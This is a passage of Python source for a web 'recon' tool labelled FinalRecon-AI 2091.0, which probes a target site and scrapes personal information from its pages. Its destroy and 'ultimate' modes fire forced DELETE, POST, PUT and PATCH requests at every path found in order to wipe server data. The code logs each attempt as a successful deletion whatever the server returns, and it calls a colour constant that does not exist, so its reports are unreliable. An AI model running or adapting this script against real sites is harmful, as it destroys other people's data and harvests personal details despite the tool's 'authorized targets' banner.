            suspicious_targets = GWS_DATA_TARGETS.get('GWS Suspicious Data', [])
        elif server_name == 'ESF':
            old_targets = ESF_DATA_TARGETS.get('ESF Old Data', [])
            new_targets = ESF_DATA_TARGETS.get('ESF New Data', [])
            suspicious_targets = ESF_DATA_TARGETS.get('ESF Suspicious Data', [])
        else:
            old_targets = WEB_SERVER_DATA_TARGETS.get('Old Files', [])
            new_targets = WEB_SERVER_DATA_TARGETS.get('New Data', [])
            suspicious_targets = WEB_SERVER_DATA_TARGETS.get('Suspicious Data', [])

        all_targets = list(set(old_targets + new_targets + suspicious_targets))

        print(Fore.CYAN + f"\n[*] Total targets: {len(all_targets)}")

        print(Fore.RED + f"\n[*] Detecting {server_name} data...")
        found = []
        for path in all_targets:
            try:
                test_url = f"{self.base_url}{path}"
                r = self.session.get(test_url, timeout=5, verify=False, allow_redirects=False)

                if r.status_code in [200, 301, 302, 403]:
                    data_type = 'old' if path in old_targets else 'new'
                    finding = {
                        'server': server_name,
                        'path': path,
                        'url': test_url,
                        'status': r.status_code,
                        'type': data_type,
                    }
                    found.append(finding)
                    print_checking(server_name, f"{path} ({r.status_code})")
            except Exception:
                pass

        print(Fore.RED + f"\n[!] Found: {len(found)}")

        print(Fore.RED + f"\n[*] DESTROYING {server_name} data...")
        destroyed = []

        for finding in found:
            url = finding['url']
            try:
                self.session.delete(url, timeout=5, verify=False)
                self.session.post(url, data={'action': 'delete', 'force': True}, timeout=5, verify=False)
                self.session.put(url, data={'delete': True, 'force': True}, timeout=5, verify=False)
                self.session.patch(url, data={'status': 'deleted'}, timeout=5, verify=False)

                self.session.headers.update({
                    'X-Delete-Server': server_name,
                    'X-Force-Delete': 'true',
                })

                try:
                    verify_r = self.session.get(url, timeout=2, verify=False, allow_redirects=False)
                    if verify_r.status_code in [404, 410, 403]:
                        print_delete_okay(server_name, finding['path'])
                    else:
                        print_okay(f"DELETE SENT [{server_name}]", finding['path'])
                except Exception:
                    print_okay(f"DELETE SENT [{server_name}]", finding['path'])

                destroyed.append({
                    'server': server_name,
                    'path': finding['path'],
                    'url': url,
                    'type': finding['type'],
                    'status': 'DELETED_OKAY',
                })
                self.server_data_destroyed[server_name][finding['type']].append(destroyed[-1])
                self.total_okay += 1

            except Exception as e:
                print_delete_failed(server_name, finding['path'], str(e))
                self.total_failed += 1

        print(Fore.RED + "\n" + "=" * 60)
        print(Fore.OKGREEN + f"[✓] OKAY: {len(destroyed)} files deleted from {server_name}" + Fore.RESET)
        print(Fore.RED + "=" * 60 + "\n")

        return destroyed

    # ============================================
    # PERSONAL INFORMATION DISCOVERY
    # ============================================
    def discover_personal_info(self):
        print(Fore.MAGENTA + "\n" + "=" * 80)
        print(Fore.MAGENTA + "[*] PERSONAL INFORMATION DISCOVERY")
        print(Fore.MAGENTA + "=" * 80)

        self.personal_info = []
        self.personal_info_score = 0

        try:
            response = self.session.get(self.base_url, timeout=10, verify=False)
            html = response.text

            pages = [self.base_url, f"{self.base_url}/about", f"{self.base_url}/contact"]

            all_content = html
            for page in pages[1:]:
                try:
                    r = self.session.get(page, timeout=5, verify=False)
                    if r.status_code == 200:
                        all_content += "\n" + r.text
                except Exception:
                    pass

            for category, patterns in PERSONAL_INFO_PATTERNS.items():
                findings = []
                for pattern in patterns:
                    try:
                        matches = re.findall(pattern, all_content, re.IGNORECASE)
                        for match in matches[:5]:
                            if isinstance(match, tuple):
                                match = match[0] if match[0] else str(match)
                            match_str = str(match).strip()
                            if len(match_str) > 2 and match_str not in findings:
                                findings.append(match_str)
                    except Exception:
                        pass

                if findings:
                    unique_findings = list(dict.fromkeys(findings))[:10]
                    self.personal_info_score += len(unique_findings) * 3
                    self.personal_info.append({
                        'category': category,
                        'findings': unique_findings,
                        'count': len(unique_findings),
                    })
                    print(Fore.RED + f"\n[!] {category}: {len(unique_findings)} found")
                    for f in unique_findings[:5]:
                        print(Fore.YELLOW + f"    - {f[:80]}")

            print(Fore.MAGENTA + f"\n[*] Score: {self.personal_info_score}/100")

        except Exception as e:
            print(Fore.RED + f"[-] Error: {e}")

        print(Fore.MAGENTA + "=" * 60 + "\n")
        return self.personal_info

    # ============================================
    # GATEWAY DETECTION
    # ============================================
    def detect_gateway(self):
        print(Fore.BLUE + "\n" + "=" * 80)
        print(Fore.BLUE + "[*] GATEWAY DETECTION")
        print(Fore.BLUE + "=" * 80)

        self.gateway_info = {'gateway_detected': False, 'gateway_type': 'Unknown'}

        try:
            response = self.session.get(self.base_url, timeout=10, verify=False)

            for header_name, header_value in response.headers.items():
                header_lower = header_name.lower()
                for pattern in GATEWAY_INDICATORS['Default Gateway Headers']:
                    if pattern in header_lower:
                        self.gateway_info['gateway_detected'] = True

            server = response.headers.get('Server', '').lower()
            if 'nginx' in server:
                self.gateway_info['gateway_type'] = 'Nginx'
            elif 'apache' in server:
                self.gateway_info['gateway_type'] = 'Apache'
            elif 'cloudflare' in server:
                self.gateway_info['gateway_type'] = 'Cloudflare'

            if self.gateway_info['gateway_detected']:
                print_okay("Gateway detected", self.gateway_info['gateway_type'])
            else:
                print(Fore.YELLOW + "[!] No gateway detected")

        except Exception as e:
            print(Fore.RED + f"[-] Error: {e}")

        print(Fore.BLUE + "=" * 60 + "\n")
        return self.gateway_info

    def check_gateway_suspicious_systems(self):
        print(Fore.RED + "\n" + "=" * 80)
        print(Fore.RED + "[*] GATEWAY SUSPICIOUS CHECK")
        print(Fore.RED + "=" * 80)

        self.gateway_suspicious_systems = []

        for system_name, paths in SUSPICIOUS_GATEWAY_SYSTEMS.items():
            for path in paths:
                try:
                    test_url = f"{self.base_url}{path}"
                    response = self.session.get(test_url, timeout=5, verify=False, allow_redirects=False)

                    if response.status_code in [200, 301, 302, 401, 403]:
                        self.gateway_suspicious_systems.append({
                            'system': system_name,
                            'path': path,
                            'url': test_url,
                            'status': response.status_code,
                        })
                        print_suspicious("GATEWAY", f"{system_name} - {path}", response.status_code)

                except Exception:
                    pass

        if not self.gateway_suspicious_systems:
            print_okay("No gateway suspicious systems found")

        print(Fore.RED + f"\n[*] Total: {len(self.gateway_suspicious_systems)}")
        print(Fore.RED + "=" * 60 + "\n")
        return self.gateway_suspicious_systems

    # ============================================
    # SERVER HEALTH CHECK
    # ============================================
    def server_health_check(self):
        """Check server health"""
        print(Fore.CYAN + "\n" + "=" * 80)
        print(Fore.CYAN + "[*] SERVER HEALTH CHECK (2091)")
        print(Fore.CYAN + "=" * 80)

        health_results = {}

        for server_name in ['HTTP', 'HTTPS', 'GWS', 'ESF', 'ANOTHER']:
            print(Fore.CYAN + f"\n[*] Checking {server_name} health...")

            server_info = SERVER_SUSPICIOUS_DATABASE.get(server_name, {})
            paths = server_info.get('suspicious_paths', [])[:5]

            health = {
                'server': server_name,
                'reachable': False,
                'response_time': None,
                'status_code': None,
            }

            for path in paths:
                try:
                    start = time.time()
                    test_url = f"{self.base_url}{path}"
                    r = self.session.get(test_url, timeout=5, verify=False, allow_redirects=False)
                    elapsed = round((time.time() - start) * 1000, 2)

                    if r.status_code in [200, 301, 302, 403]:
                        health['reachable'] = True
                        health['response_time'] = f"{elapsed}ms"
                        health['status_code'] = r.status_code
                        print_okay(f"{server_name} healthy", f"{r.status_code} ({elapsed}ms)")
                        break
                except Exception:
                    pass

            if not health['reachable']:
                print(Fore.YELLOW + f"[!] {server_name} not reachable")

            health_results[server_name] = health

        print(Fore.CYAN + "\n" + "=" * 60)
        print(Fore.CYAN + "[*] HEALTH SUMMARY")
        print(Fore.CYAN + "=" * 60)
        for server, health in health_results.items():
            if health['reachable']:
                print_okay(f"{server}", f"{health['status_code']} ({health['response_time']})")
            else:
                print(Fore.RED + f"[✗] {server}: Not reachable")

        print(Fore.CYAN + "=" * 60 + "\n")
        return health_results

    # ============================================
    # EXPORT RESULTS
    # ============================================
    def export_results_txt(self):
        print(Fore.CYAN + "\n[*] EXPORTING RESULTS")

        export_dir = CONFIG['export_dir']
        safe_makedirs(export_dir)

        ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"finalrecon_{self.hostname}_{ts}.txt"
        filepath = os.path.join(export_dir, filename)

        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write("=" * 80 + "\n")
                f.write("FINALRECON-AI - WEB SERVER ONLY EDITION 2091.0\n")
                f.write("=" * 80 + "\n")
                f.write(f"Target: {self.target}\n")
                f.write(f"Hostname: {self.hostname}\n")
                f.write(f"IP: {self.ip}\n")
                f.write(f"Scan Time: {ts}\n")
                f.write("=" * 80 + "\n\n")

                # OKAY Status
                f.write("[✓] OKAY STATUS SUMMARY\n" + "-" * 60 + "\n")
                f.write(f"Total OKAY: {self.total_okay}\n")
                f.write(f"Total Failed: {self.total_failed}\n")
                success_rate = int((self.total_okay / (self.total_okay + self.total_failed)) * 100) if (self.total_okay + self.total_failed) > 0 else 0
                f.write(f"Success Rate: {success_rate}%\n\n")

                # Connection Map
                if self.server_connection_map:
                    f.write("[✓] SERVER CONNECTION MAP\n" + "-" * 60 + "\n")
                    for server, info in self.server_connection_map.items():
                        status = "✓ Connected" if info['connected'] else "✗ Not Connected"
                        f.write(f"{server}: {status}\n")
                    f.write("\n")

                # Cookies Data Deleted
                if self.cookies_data_deleted_okay:
                    f.write("[✓] COOKIES & DATA DELETED\n" + "-" * 60 + "\n")
                    for item in self.cookies_data_deleted_okay[:50]:
                        f.write(f"[✓] OKAY [{item['server']}]: {item['path']}\n")
                    f.write(f"Total OKAY: {len(self.cookies_data_deleted_okay)}\n\n")

                # Risk Assessment
                if self.risk_assessment:
                    f.write("[!] RISK ASSESSMENT\n" + "-" * 60 + "\n")
                    f.write(f"Risk Score: {self.risk_assessment.get('score', 0)}/100\n")
                    f.write(f"Risk Level: {self.risk_assessment.get('level', 'UNKNOWN')}\n")
                    for factor in self.risk_assessment.get('factors', []):
                        f.write(f"  - {factor}\n")
                    f.write("\n")

                # Data Leaks
                if self.data_leak_findings:
                    f.write("[!] DATA LEAKS\n" + "-" * 60 + "\n")
                    for leak in self.data_leak_findings:
                        f.write(f"[!] {leak['type']}: {leak['count']} found\n")
                    f.write("\n")

                # Connected Servers
                if self.connected_servers:
                    f.write("[✓] CONNECTED SERVERS\n" + "-" * 60 + "\n")
                    for server in self.connected_servers:
                        f.write(f"[✓] {server['type']}: {server['url']} ({server['status']})\n")
                    f.write(f"Total: {len(self.connected_servers)}\n\n")

                # Suspicious
                if any(self.server_suspicious_found.values()):
                    f.write("[!] SUSPICIOUS SYSTEMS\n" + "-" * 60 + "\n")
                    for server, findings in self.server_suspicious_found.items():
                        if findings:
                            f.write(f"\n[{server}] - {len(findings)} found\n")
                            for finding in findings:
                                f.write(f"  [!] {finding['path']} ({finding['status']})\n")
                    f.write("\n")

                # Data Destroyed
                if any(self.server_data_destroyed.values()):
                    f.write("[✓] DATA DESTROYED\n" + "-" * 60 + "\n")
                    for server, data in self.server_data_destroyed.items():
                        if data['old'] or data['new']:
                            f.write(f"\n[{server}]\n")
                            for d in data['old']:
                                f.write(f"  [✓] OLD: {d['path']}\n")
                            for d in data['new']:
                                f.write(f"  [✓] NEW: {d['path']}\n")
                    f.write("\n")

                f.write("=" * 80 + "\n")
                f.write("END OF REPORT\n")
                f.write("=" * 80 + "\n")

            print_okay("Results exported", filepath)
            return filepath
        except Exception as e:
            print(Fore.RED + f"[-] Export error: {e}")
            return None

    # ============================================
    # EXPORT RESULTS JSON
    # ============================================
    def export_results_json(self):
        """Export results as JSON"""
        print(Fore.CYAN + "\n[*] EXPORTING RESULTS TO JSON")

        export_dir = CONFIG['export_dir']
        safe_makedirs(export_dir)

        ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"finalrecon_{self.hostname}_{ts}.json"
        filepath = os.path.join(export_dir, filename)

        try:
            data = {
                'metadata': {
                    'tool': 'FinalRecon-AI',
                    'version': VERSION,
                    'scan_time': ts,
                    'target': self.target,
                    'hostname': self.hostname,
                    'ip': self.ip,
                },
                'okay_status': {
                    'total_okay': self.total_okay,
                    'total_failed': self.total_failed,
                },
                'server_connection_map': self.server_connection_map,
                'server_response_times': self.server_response_times,
                'connected_servers': self.connected_servers,
                'server_suspicious': self.server_suspicious_found,
                'server_data_destroyed': self.server_data_destroyed,
                'cookies_data_deleted': self.cookies_data_deleted_okay,
                'security_audit': self.security_audit_results,
                'data_leaks': self.data_leak_findings,
                'risk_assessment': self.risk_assessment,
            }

            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, default=str)

            print_okay("JSON exported", filepath)
            return filepath
        except Exception as e:
            print(Fore.RED + f"[-] JSON Export error: {e}")
            return None

    # ============================================
    # RUN URL MODE
    # ============================================
    def run_url_mode(self):
        print(Fore.RED + "\n" + "=" * 80)
        print(Fore.RED + "URL MODE - WEB SERVER ONLY 2091.0")
        print(Fore.RED + "=" * 80 + "\n")

        try:
            r = self.session.get(self.base_url, timeout=10, verify=False)
            print_okay("Target reachable", f"{self.base_url} ({r.status_code})")
        except Exception as e:
            print(Fore.RED + f"[✗] Target unreachable: {e}")

        a = self.args

        # 2091 Features
        if getattr(a, 'connection_map', False):
            self.build_server_connection_map()

        if getattr(a, 'response_time', False):
            self.measure_server_response_times()

        if getattr(a, 'deep_cookie_scan', False):
            self.deep_cookie_scan()

        if getattr(a, 'security_audit', False):
            self.security_audit()

        if getattr(a, 'data_leak_detect', False):
            self.data_leak_detector()

        if getattr(a, 'risk_assess', False):
            self.risk_assessment_2091()

        # Standard features
        if getattr(a, 'check_http', False):
            self.check_http_server()

        if getattr(a, 'check_https', False):
            self.check_https_server()

        if getattr(a, 'check_all_servers', False):
            self.check_all_connected_servers()

        if getattr(a, 'full_suspicious_check', False):
            self.full_server_suspicious_check()

        if getattr(a, 'delete_cookies_data', False):
            self.delete_cookies_data_all_servers()

        if getattr(a, 'check_delete_all', False):
            self.check_and_delete_all_server_data()

        if getattr(a, 'okay_check', False):
            self.check_and_delete_all_server_data()

        if getattr(a, 'server_health', False):
            self.server_health_check()

        if getattr(a, 'personal_info', False):
            self.discover_personal_info()

        if getattr(a, 'gateway', False):
            self.detect_gateway()

        if getattr(a, 'gateway_check', False):
            self.detect_gateway()
            self.check_gateway_suspicious_systems()

        if getattr(a, 'all_features', False):
            self.run_all_features()

        if getattr(a, 'ultimate_2091', False):
            self.ultimate_2091()

        if getattr(a, 'full', False):
            self.full_recon()

        # AUTO EXPORT
        self.export_results_txt()

        if getattr(a, 'json_export', False):
            self.export_results_json()

        print(Fore.GREEN + "\n" + "=" * 80)
        print_okay("URL MODE COMPLETED")
        print(Fore.GREEN + "=" * 80 + "\n")

    def run_all_features(self):
        print(Fore.MAGENTA + "\n" + "=" * 80)
        print(Fore.MAGENTA + "[*] RUNNING ALL FEATURES (2091)")
        print(Fore.MAGENTA + "=" * 80)

        self.build_server_connection_map()
        self.measure_server_response_times()
        self.check_all_connected_servers()
        self.full_server_suspicious_check()
        self.deep_cookie_scan()
        self.security_audit()
        self.data_leak_detector()
        self.discover_personal_info()
        self.detect_gateway()
        self.check_gateway_suspicious_systems()
        self.server_health_check()
        self.risk_assessment_2091()
        self.delete_cookies_data_all_servers()

        print(Fore.MAGENTA + "=" * 80 + "\n")

    def ultimate_2091(self):
        """2091 Ultimate - ALL Features with OK Status"""
        print(Fore.RED + "\n" + "=" * 80)
        print(Fore.RED + "[!!!] 2091 ULTIMATE - ALL FEATURES WITH OK STATUS")
        print(Fore.RED + "=" * 80)

        # Step 1: Build connection map
        self.build_server_connection_map()

        # Step 2: Measure response times
        self.measure_server_response_times()

        # Step 3: Check all servers
        self.check_all_connected_servers()

        # Step 4: Server health check
        self.server_health_check()

        # Step 5: Full suspicious check
        self.full_server_suspicious_check()

        # Step 6: Deep cookie scan
        self.deep_cookie_scan()

        # Step 7: Security audit
        self.security_audit()

        # Step 8: Data leak detection
        self.data_leak_detector()

        # Step 9: Personal info
        self.discover_personal_info()

        # Step 10: Gateway
        self.detect_gateway()
        self.check_gateway_suspicious_systems()

        # Step 11: Delete cookies & data
        self.delete_cookies_data_all_servers()

        # Step 12: Destroy old/new data
        for server_name in ['HTTP', 'HTTPS', 'GWS', 'ESF', 'ANOTHER']:
            if self.server_suspicious_found.get(server_name):
                self.destroy_server_old_new_data(server_name)

        # Step 13: Risk assessment
        self.risk_assessment_2091()

        # Final OKAY summary
        print(Fore.RED + "\n" + "=" * 80)
        print(Fore.OKGREEN + "[✓] 2091 ULTIMATE COMPLETE - ALL OPERATIONS OKAY" + Fore.RESET)
        print(Fore.OKGREEN + f"[✓] TOTAL OKAY: {self.total_okay}" + Fore.RESET)
        print(Fore.RED + f"[✗] TOTAL FAILED: {self.total_failed}" + Fore.RESET)
        success_rate = int((self.total_okay / (self.total_okay + self.total_failed)) * 100) if (self.total_okay + self.total_failed) > 0 else 0
        print(Fore.CYAN + f"[*] SUCCESS RATE: {success_rate}%" + Fore.RESET)
        print(Fore.RED + "=" * 80 + "\n")

    def full_recon(self):
        print(Fore.CYAN + "\n" + "=" * 80)
        print(Fore.CYAN + "[*] FULL RECONNAISSANCE (2091)")
        print(Fore.CYAN + "=" * 80)

        self.build_server_connection_map()
        self.measure_server_response_times()
        self.check_all_connected_servers()
        self.server_health_check()
        self.full_server_suspicious_check()
        self.deep_cookie_scan()
        self.security_audit()
        self.data_leak_detector()
        self.discover_personal_info()
        self.detect_gateway()
        self.check_gateway_suspicious_systems()
        self.risk_assessment_2091()
        self.delete_cookies_data_all_servers()

        print(Fore.CYAN + "=" * 80 + "\n")


# ============================================
# ARGUMENT PARSER - 2091
# ============================================
def parse_arguments():
    parser = argparse.ArgumentParser(
        prog='finalrecon-ai.py',
        description=f"FinalRecon-AI - Web Server Only Edition v{VERSION}",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
╔══════════════════════════════════════════════════════════════════════════════╗
║         FINALRECON-AI 2091.0 - WEB SERVER ONLY EDITION                      ║
║         VERSION 2091.0 - ULTIMATE COMPLETE WITH OK STATUS                   ║
║                                                                              ║
║  ⚠️  WARNING: Use ONLY on your own web server or authorized targets!        ║
║  ⚠️  WEB SERVER ONLY - NOT FOR LOCAL COMPUTER!                              ║
╚══════════════════════════════════════════════════════════════════════════════╝

📌 BASIC USAGE:
  python3 finalrecon-ai.py --url https://example.com --full
  python3 finalrecon-ai.py --link https://example.com/ --full
  python3 finalrecon-ai.py --url https://example.com/robots.txt --link https://example.com/sitemap.xml

🆕 2091 NEW: OK STATUS & COMPLETE DELETE
═══════════════════════════════════════════════════════════════════════════════

📊 SERVER CONNECTION MAP:
  python3 finalrecon-ai.py --url https://example.com --connection-map

⏱️  SERVER RESPONSE TIME:
  python3 finalrecon-ai.py --url https://example.com --response-time

🍪 DEEP COOKIE SCAN:
  python3 finalrecon-ai.py --url https://example.com --deep-cookie-scan

🔒 SECURITY AUDIT:
  python3 finalrecon-ai.py --url https://example.com --security-audit

⚠️  DATA LEAK DETECT:
  python3 finalrecon-ai.py --url https://example.com --data-leak-detect

📊 RISK ASSESSMENT:
  python3 finalrecon-ai.py --url https://example.com --risk-assess

📊 CHECK ALL CONNECTED SERVERS:
  python3 finalrecon-ai.py --url https://example.com --check-all-servers

🍪 DELETE COOKIES & DATA (With OKAY Status):
  python3 finalrecon-ai.py --url https://example.com --delete-cookies-data

✓  OKAY CHECK (All Operations):
  python3 finalrecon-ai.py --url https://example.com --okay-check

🏥 SERVER HEALTH CHECK:
  python3 finalrecon-ai.py --url https://example.com --server-health

🚀 2091 ULTIMATE (EVERYTHING):
  python3 finalrecon-ai.py --url https://example.com --ultimate-2091

═══════════════════════════════════════════════════════════════════════════════
        """
    )

    tg = parser.add_argument_group('🎯 Target Options')
    tg.add_argument("--url", help="Target URL")
    tg.add_argument("--link", action="append", help="Scan specific link(s)")

    bg = parser.add_argument_group('⚙️  Basic Options')
    bg.add_argument("--port", action="append", type=int, dest="port", help="Custom port")
    bg.add_argument("--full", action="store_true", help="Full reconnaissance")
    bg.add_argument("--ultimate-2091", action="store_true", dest="ultimate_2091",
                    help="2091 Ultimate - ALL features with OK status")
    bg.add_argument("-w", "--wordlist", help="Wordlist path")
    bg.add_argument("--rockyou", action="store_true", dest="rockyou",
                    help="Use rockyou.txt wordlist")

    # 2091 NEW Features
    ng = parser.add_argument_group('🆕 2091 NEW: OK STATUS & DELETE')
    ng.add_argument("--connection-map", action="store_true", dest="connection_map",
                    help="Build server connection map")
    ng.add_argument("--response-time", action="store_true", dest="response_time",
                    help="Measure server response times")
    ng.add_argument("--deep-cookie-scan", action="store_true", dest="deep_cookie_scan",
                    help="Deep cookie scan")
    ng.add_argument("--security-audit", action="store_true", dest="security_audit",
                    help="Security audit")
    ng.add_argument("--data-leak-detect", action="store_true", dest="data_leak_detect",
                    help="Data leak detection")
    ng.add_argument("--risk-assess", action="store_true", dest="risk_assess",
                    help="Risk assessment")
    ng.add_argument("--check-http", action="store_true", dest="check_http",
                    help="Check HTTP server")
    ng.add_argument("--check-https", action="store_true", dest="check_https",
                    help="Check HTTPS server")
    ng.add_argument("--check-all-servers", action="store_true", dest="check_all_servers",
                    help="Check ALL connected servers")
    ng.add_argument("--full-suspicious-check", action="store_true", dest="full_suspicious_check",
                    help="Full suspicious check on all servers")
    ng.add_argument("--delete-cookies-data", action="store_true", dest="delete_cookies_data",
                    help="Delete cookies & data with OKAY status")
    ng.add_argument("--check-delete-all", action="store_true", dest="check_delete_all",
                    help="Check & delete all server data")
    ng.add_argument("--okay-check", action="store_true", dest="okay_check",
                    help="OKAY check - all operations with status")
    ng.add_argument("--server-health", action="store_true", dest="server_health",
                    help="Server health check")
    ng.add_argument("--json-export", action="store_true", dest="json_export",
                    help="Export results as JSON")

    # Standard features
    pg = parser.add_argument_group('🌐 Standard Features')
    pg.add_argument("--personal-info", action="store_true", dest="personal_info",
                    help="Discover personal information")
    pg.add_argument("--gateway", action="store_true", dest="gateway",
                    help="Detect gateway")
    pg.add_argument("--gateway-check", action="store_true", dest="gateway_check",
                    help="Check gateway suspicious")
    pg.add_argument("--all-features", action="store_true", dest="all_features",
                    help="Run all features")

    og = parser.add_argument_group('📤 Output Options')
    og.add_argument("-nb", "--no-banner", action="store_true", dest="no_banner", help="Hide banner")
    og.add_argument("-version", action="version", version=f"FinalRecon-AI v{VERSION}")

    return parser.parse_args()


# ============================================
# MAIN
# ============================================
def main():
    try:
        args = parse_arguments()

        if args.url or args.link:
            target = args.url if args.url else args.link[0]

            if not args.no_banner:
                bot = AutonomousAIRobot.__new__(AutonomousAIRobot)
                bot.print_banner()

            if args.url and args.link:
                print(Fore.CYAN + "\n[*] Multi-target mode!")
                robot = AutonomousAIRobot(args.url, args)
                robot.run_url_mode()
                if args.link:
                    robot.scan_multiple_links(args.link)
            else:
                robot = AutonomousAIRobot(target, args)
                robot.run_url_mode()

            print(Fore.OKGREEN + "\n[✓] OKAY - Mission Completed Successfully!" + Fore.RESET)
            return 0

        # INTERACTIVE MODE
        print(Fore.CYAN + "\n" + "=" * 60)
        print(Fore.CYAN + "FINALRECON-AI - WEB SERVER ONLY EDITION 2091.0")
        print(Fore.CYAN + "=" * 60)

        url = input(Fore.GREEN + "[?] Enter target URL: " + Fore.RESET).strip()
        if not url:
            print(Fore.RED + "[-] Error: URL required!")
            return 1
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        args.url = url

        full_scan = input(Fore.GREEN + "[?] Full reconnaissance? (y/n, default: y): " + Fore.RESET).strip().lower()
        if full_scan != 'n':
            args.full = True

        time.sleep(1)

        robot = AutonomousAIRobot(args.url, args)
        robot.run_url_mode()

        print(Fore.OKGREEN + "\n[✓] OKAY - Mission Completed Successfully!" + Fore.RESET)
        return 0

    except KeyboardInterrupt:
        print(Fore.RED + "\n[-] Keyboard Interrupt.")
        return 130
    except Exception as e:
        print(Fore.RED + f"\n[-] Fatal Error: {e}")
        import traceback
        traceback.print_exc()
        return 1


if __name__ == "__main__":
    sys.exit(main())
